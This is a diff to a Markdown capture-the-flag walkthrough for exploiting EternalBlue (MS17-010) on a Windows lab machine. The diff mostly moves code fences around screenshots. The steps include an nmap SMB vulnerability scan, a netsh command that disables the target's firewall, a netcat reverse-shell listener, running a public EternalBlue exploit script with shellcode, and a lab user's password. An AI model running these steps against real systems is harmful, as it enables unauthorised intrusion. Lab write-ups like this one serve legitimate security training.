@@ -41,17 +41,18 @@ Ensure that your IP address matches the subnet of the target machine.
 Use nmap to scan for open ports and detect if the target is vulnerable:
 nmap -p 139,445 --script smb-vuln-ms17-010 <target-ip>
 Confirm that TCP ports 139 and 445 are open and that the SMB service is vulnerable.
+```
 ![image](https://github.com/user-attachments/assets/0e34d61b-b5d9-4a8d-8557-1efa66c33360)
-
-
+```
 3. Disable Firewalls (on the target)
 If possible, run:
 netsh advfirewall set allprofiles state off
 This ensures no interference during the exploitation process.
+```
 ![image](https://github.com/user-attachments/assets/20b1f218-6bea-4645-9c7d-36cb5286a7cd)
 
 Password for Flag user that isnt the flag: 4770_sethwhy
-
+```
 4. Exploit EternalBlue:
 Use Metasploit or any other payload generator to create a reverse TCP payload.
 Some links for help the way I did it - https://github.com/helviojunior/MS17-010, https://github.com/worawit/MS17-010, https://redteamzone.com/EternalBlue/, https://www.rapid7.com/blog/post/2017/05/20/metasploit-the-power-of-the-community-and-eternalblue/
@@ -63,23 +64,24 @@ Assemble shellcode & create payload
 
 - Set up a listener on your attacking machine:
 nc -lvnp 4445
+```
 ![image](https://github.com/user-attachments/assets/a047336f-6970-4db7-824a-5b9f5cdca0a8)
 
-
 - Run the command "python eternalblue_exploit7 <target-ip> <any shellcode that works>"
-
 - Deliver the payload to the target and exploit the vulnerability.
+  
 ![image](https://github.com/user-attachments/assets/678fa158-d826-4a15-bc05-94dcf7e93e7b)
 
-
+```
 5. Gain Administrative Privileges:
 Once inside the system, check to see if privileges were escalated.
+```
 ![image](https://github.com/user-attachments/assets/a1b09373-8e51-4873-b03b-ccaf7e21eb81)
-
-
+```
 6. Search for the Flag:
 Look for .txt files in the C:\Windows\System32 directory with this command:
 dir *.txt /s /b
+```
 ![image](https://github.com/user-attachments/assets/c5bd2e43-70cd-4013-b4e3-3b5820d18d90)
 
 
